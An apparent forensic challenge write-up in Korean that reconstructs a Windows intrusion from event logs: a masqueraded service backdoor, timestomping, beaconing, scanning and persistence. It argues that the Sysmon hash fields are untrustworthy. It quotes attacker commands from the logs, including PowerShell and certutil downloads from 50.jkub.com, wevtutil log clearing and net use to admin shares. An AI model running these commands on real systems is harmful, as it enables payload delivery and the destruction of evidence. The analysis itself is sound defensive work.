> **한 줄 결론**: 공격자는 파일명·서비스명·타임스탬프를 전부 정상 Windows 구성요소처럼 위장했고, **Sysmon 로그의 Hash 필드마저 실제 파일과 불일치**했다. 이 사건에서 신뢰할 수 있는 IOC 는 해시가 아니라 **경로·부모/자식 관계·서비스 등록·네트워크 행위** 였다.

## 무엇이 주어졌나

CSV 로 파싱된 Windows 아티팩트 묶음과 확장자를 죽여 놓은 바이너리 두 개.

- `Security.csv`, `System.csv`, `Sysmon.csv`, `Services.csv`
- `MFT_C_.csv`, `Prefetch.csv`, `AppCompatCache.csv`
- `TerminalServices-LocalSessionManager.csv`
- `chkip.ex_`, `wmiapsvr.ex_`

| 파일 | MD5 | SHA-256 |
|---|---|---|
| `chkip.ex_` | `4bc7ed32a5cfa053cc41fc8df3347058` | `14d73c98617d84a578ef0e2edeb4c1e9b4226a1dfce0402e14ab3ca91ca15656` |
| `wmiapsvr.ex_` | `17922a21611c42f6bb8802e70e74bab7` | `72fd1a227c9d4febea517d71960314da25c9480150378f3d8e50e11595f1bd64` |

모든 시각은 문제 조건에 따라 KST(UTC+9) 로컬 시각으로 해석했다.

## 1. 최초 침투 — RDP, 그리고 확정할 수 없는 첫 파일

Security 로그의 4625 실패 → 4624 성공, 그리고 TerminalServices 의 Event ID 21(세션 로그온) / 22(셸 시작)가 **같은 계정, 같은 외부 IP** 를 가리킨다. `WorkstationName` 이 정상 관리망의 `MGMT-PC` 가 아니라 `ATTACKER` 로 찍혀 있는 것도 결정적이다.

```powershell
$sec = Import-Csv .\work\dataset\Security.csv
$sec | Where-Object {
  $_.EventID -in '4624','4625' -and
  $_.'EventData.IpAddress' -eq '61.110.67.60'
} | Sort-Object Timestamp
```

"최초 생성된 악성 실행 파일" 은 깔끔하게 답이 떨어지지 않았다. AppCompatCache 기준 가장 이른 것은 `VV511.EXE`(09:14:34.986) 지만, **본문이 데이터셋에 없어서 정적 분석으로 악성 여부를 확정할 수 없다.** 제공된 바이너리 두 개 기준으로는 `chkip.exe`(09:14:39.243) 가 가장 이르고, 생성·실행·서비스 등록·네트워크 통신까지 전부 교차검증되는 것은 `wmiapsvr.exe` 다.

셋을 하나로 뭉개지 않고 **"가장 이른 흔적 / 확정 가능한 최초 샘플 / 최초 서비스형 백도어"** 로 나눠 적었다. 데이터셋에 없는 파일을 악성으로 단정하는 것도, 확실한 것을 빼놓는 것도 둘 다 틀린 답이다.

## 2. 첫 지속성 — IIS 워커가 띄운 서비스

```
Sysmon EID 1 @ 2020-05-21 18:20:02
  Image       : C:\inetpub\wwwroot\upload\wmiapsvr.exe
  ParentImage : C:\Windows\System32\inetsrv\w3wp.exe
  User        : IIS APPPOOL\DefaultAppPool

System EID 7045 @ 2020-05-21 18:20:10
  Service Name      : WmiApRpl
  Service File Name : C:\inetpub\wwwroot\upload\wmiapsvr.exe
  Start Type        : auto start
  Account           : LocalSystem
```

프로세스 실행 → 서비스 등록 → 서비스 레지스트리 기록이 **8초 안에** 맞물린다. IIS 워커 프로세스가 웹 루트의 `upload` 디렉터리에서 실행 파일을 띄우는 흐름은 웹셸/업로드 취약점 이후의 전형적인 패턴이다.

## 3. 은폐 — 세 가지 방식

**(1) 로그 삭제.** System 로그에 Event ID 104 가 두 건(System, Windows PowerShell) 남았고, Sysmon 에는 실제 명령이 그대로 남았다.

```
2020-05-21 18:20:38  wevtutil.exe cl Security
2020-05-21 18:20:47  wevtutil.exe cl System
ParentCommandLine: cmd.exe /c wevtutil cl Security & wevtutil cl System
User: NEXONBRIDGE\Administrator
```

로그를 지운 행위가 다른 로그에 남는 구조라 추정이 아니라 확인이 된다.

**(2) 정상 구성요소 위장.** 이 문제의 제목이 여기서 온다.

| 위장물 | 사칭 대상 | 왜 가짜인가 |
|---|---|---|
| `WmiApRpl` / "Windows Management Instrumentation Performance Adapter" | WMI 성능 어댑터 | 실행 경로가 `C:\inetpub\wwwroot\upload\` |
| `C:\Windows\Speech\svchost.exe -k SpeechRuntime` | svchost | 정상 svchost 는 `System32` 에만 있다 |
| `FontCacheSvc` / `C:\Windows\Fonts\config.exe -s` | 폰트 캐시 서비스 | 실행 파일 경로·등록 방식이 비정상 |

**(3) 타임스탬프 조작.** MFT 상 `wmiapsvr.exe` 의 Created/LastModified 는 **2019-11-15** 인데, AppCompatCache(18:19:58)·Sysmon(18:20:02)·System 7045(18:20:10)는 전부 **2020-05-21** 을 가리킨다. 파일시스템 시간만 보면 반년 넘게 존재해 온 파일처럼 보인다. timestomping 이거나 최소한 타임스탬프 신뢰성이 훼손된 상태다.

## 4. wmiapsvr — 서비스형 백도어

실행하지 않고 ASCII 문자열만 뽑았다.

```powershell
$bytes = [IO.File]::ReadAllBytes((Resolve-Path '.\work\dataset\wmiapsvr.ex_'))
$text  = [Text.Encoding]::ASCII.GetString($bytes)
[regex]::Matches($text,'[ -~]{4,}') | ForEach-Object {$_.Value} |
  Where-Object {$_ -match 'Service|WMI|wmiapsvr|cmd|Connect|sleep'}
```

```
CreateServiceW / StartServiceW / OpenServiceW / DeleteService
StartServiceCtrlDispatcherW / RegisterServiceCtrlHandlerExW / SetServiceStatusW
WMI Performance AdpMer
Windows Management Instrumentation (WMI)
C:\Windows\SysWOW64\wbem\
cmd.exe / remoteApi / sleep / Connect
```

서비스 제어 API 와 WMI 위장 문자열이 **한 바이너리 안에 같이** 있다. PE 헤더를 수동 파싱하면 32-bit PE, 섹션 4개, `TimeDateStamp = 1525355295`(2018-05-03 13:48:15 UTC). 컴파일 시각 자체는 악성 판단의 근거가 못 되지만, 서비스 API + 위장 문자열 + 웹 루트 실행 경로 + 5분 주기 외부 통신을 합치면 서비스형 백도어 판단이 선다.

## 5. 외부 통신 — 세 갈래

**beacon.** `wmiapsvr.exe` 가 `IIS APPPOOL\DefaultAppPool` 권한으로 5분 간격 반복 연결. 목적지가 IP 가 아니라 도메인이고 53/443 을 섞어 쓴다.

```
18:20:15 50.jkub.com:53      18:35:22 50.jkub.com:53
18:25:20 50.jkub.com:53      18:40:19 19.otzo.com:443
18:30:18 50.otzo.com:53      18:45:21 50.jkub.com:53
```

**추가 페이로드 다운로드.** IIS 워커가 직접 LOLBin 을 호출했다.

```
powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://50.jkub.com/a')"
certutil.exe -urlcache -split -f http://50.jkub.com/t.txt c:\windows\temp\t.txt
```

같은 `50.jkub.com` 이 beacon 목적지와 다운로드 소스에 동시에 등장한다. 단순 외부 접속이 아니라 공격자 인프라라는 판단의 근거가 여기서 나온다.

**보조 채널.** 6일 뒤 심긴 `SpeechRuntime` 이 `185.220.101.47:443` 으로 5분 간격 연결. 장기 재접속용 백업 채널로 보인다.

## 6. 해시 IOC 를 믿을 수 있는가 — 이 문제의 핵심

로그에 적힌 해시와 실제 파일 해시를 대조했다.

| 대상 | Sysmon 로그의 MD5 | 실제 파일 MD5 |
|---|---|---|
| `wmiapsvr.exe` | `3B2F9CB9CF0E1438B4E9255A5E757843` | `17922A21611C42F6BB8802E70E74BAB7` |
| `chkip.exe` | `2C4F8A1E7B3D509C6F2E1B8A3D7C4F09` | `4BC7ED32A5CFA053CC41FC8DF3347058` |

둘 다 불일치다. 여기서 멈추면 "제공 파일이 로그 속 파일과 다른가?" 로 끝나지만, 정상 시스템 바이너리도 확인해 봤다.

```
18:22:41  cmd.exe /c whoaim  →  MD5=45E0EDACA8702E6E90D1D98CF3647D5F
18:23:50  cmd.exe /c whoami  →  MD5=AD7B9C14083B52BC532FBA5948342B98
```

**같은 경로의 `C:\Windows\System32\cmd.exe` 가 69초 만에 다른 MD5 로 기록된다.** 정상적으로는 설명되지 않는다. Hash 필드 자체가 수집/가공 과정에서 신뢰성을 잃었거나 조작됐다고 봐야 한다.

그래서 IOC 를 두 등급으로 나눠 적었다.

**신뢰 가능**
- 경로: `C:\inetpub\wwwroot\upload\wmiapsvr.exe`, `C:\Windows\Speech\svchost.exe`, `C:\Windows\Fonts\config.exe`, `C:\Users\a\Downloads\chkip.exe`
- 서비스: `WmiApRpl`, `SpeechRuntime`, `FontCacheSvc`, Run 키 `WindowsFontCache`
- 도메인/IP: `50.jkub.com`, `50.otzo.com`, `19.otzo.com`, `185.220.101.47`, `61.110.67.60`, `113.72.51.210`
- 명령행: `wevtutil cl`, `DownloadString('http://50.jkub.com/a')`, `certutil -urlcache`, `chkip.exe 192.168.1.0/24`

**단독 신뢰 금지**
- Sysmon Hash 필드의 MD5 전부

## 7. chkip — 문자열과 실제 실행이 어긋난다

`chkip.ex_` 의 사용법 문자열은 이렇게 되어 있다.

```
Usage:   %s -S StartIP -E EndIP
```

그런데 실제 실행 명령은 `chkip.exe 192.168.1.0/24` 다. CIDR 을 받는 인터페이스가 아니다. 가능한 해석은 세 가지 — 다른 버전의 사용법 문자열이 남았거나, 래퍼/수정본이 쓰였거나, 로그의 CommandLine 필드가 실제와 다르거나. 앞의 해시 불일치를 감안하면 세 번째도 배제할 수 없다.

이상점이 하나 더 있다. **AppCompatCache 와 Prefetch 에는 실행 흔적이 있는데 MFT 에서는 `chkip.exe` 가 검색되지 않는다.** 수집 시점 전에 삭제됐거나 파일시스템 흔적이 정리됐다는 뜻이다.

스캔 결과 자체는 Sysmon EID 3 에 그대로 남았다.

| 대상 | 포트 | 후보 서비스 |
|---|---|---|
| 192.168.1.135 | 22 | SSH |
| 192.168.1.106 | 23 | Telnet |
| 192.168.1.197 / 192.168.1.10 | 3389 | RDP |
| 192.168.1.105 / 192.168.1.50 | 445 | SMB |
| 192.168.1.211 | 1433 | MSSQL |

## 8. 내부 확산 — "시도는 확인, 성공은 미확정"

스캔 직후 SMB 로 붙으려는 시도가 이어진다.

```
16:12:07  cmd.exe /c net use \\192.168.1.105\c$ /user:administrator   (parent: w3wp.exe)
16:12:09  net.exe   net use \\192.168.1.105\c$
```

Security 로그에는 명시적 자격 증명 사용(4648)도 있다 — `192.168.1.50:445`, LogonType 3.

여기서 결론을 어디까지 밀 것인가가 갈린다. 정찰이 실제로 수행됐고 최소 두 SMB 후보에 후속 접근 시도가 있었던 것은 확실하다. 하지만 **대상 호스트의 인증 성공, 파일 복사, 원격 서비스 생성 증거는 이 호스트의 아티팩트만으로 확인되지 않는다.** 그래서 "정찰 후 SMB 기반 확산 시도까지 확인, 성공 여부 미확정" 으로 분리해 적었다.

## 9. 지속성 — 네 겹

| 유형 | 내용 | 시각 |
|---|---|---|
| 서비스 | `WmiApRpl` → `wmiapsvr.exe` | 05-21 18:20:10 |
| 서비스 | `SpeechRuntime` → `Speech\svchost.exe` | 05-27 15:53:44 |
| 서비스 | `FontCacheSvc` → `Fonts\config.exe -s` | 05-29 14:15:02 |
| Run 키 | `HKLM\...\Run\WindowsFontCache` → 같은 `config.exe -s` | 05-29 14:11:05 |
| 계정 | `svc-monitor` 생성(4720) → Administrators 추가(4728) | 06-02 06:32 |

`config.exe` 하나가 서비스와 Run 키 **양쪽**에 등록돼 있다. 하나를 지워도 다른 하나가 살아남는 구성이다. 여기에 파일 기반 백도어와 완전히 독립적인 계정 기반 재접근까지 확보했다.

외부 RDP 성공도 초기 침투 한 번으로 끝나지 않았다. `113.72.51.210` 에서 05-25, 05-27, 05-29, 05-30(3회), 그리고 `185.220.101.47` 에서 06-01 까지 Administrator 로 반복 성공한다.

## 정리 — 이 문제에서 남는 것

**해시 IOC 는 무료가 아니다.** 이 사건에서 Sysmon Hash 필드는 악성 파일뿐 아니라 정상 `cmd.exe` 에 대해서도 일관성이 없었다. 해시만으로 동일성을 판정했다면 "제공 샘플은 사건과 무관" 이라는 정반대 결론이 나왔을 것이다.

**교차검증 축을 미리 정해 두는 것이 답을 만든다.** 이 문제에서 쓸 만했던 축은 경로, 부모/자식 프로세스, 서비스 등록(7045 + Services 레지스트리), 네트워크 목적지, 그리고 파일시스템 시간과 실행 흔적 시간의 **불일치** 였다. 하나가 오염돼도 나머지로 판단이 선다.

**모르는 것은 모른다고 적는다.** `VV511.EXE` 는 데이터셋에 없어서 악성이라고 쓸 수 없었고, 내부 확산은 대상 호스트 로그가 없어서 성공이라고 쓸 수 없었다. 근거 범위를 넘어선 단정은 오답보다 나쁘다.
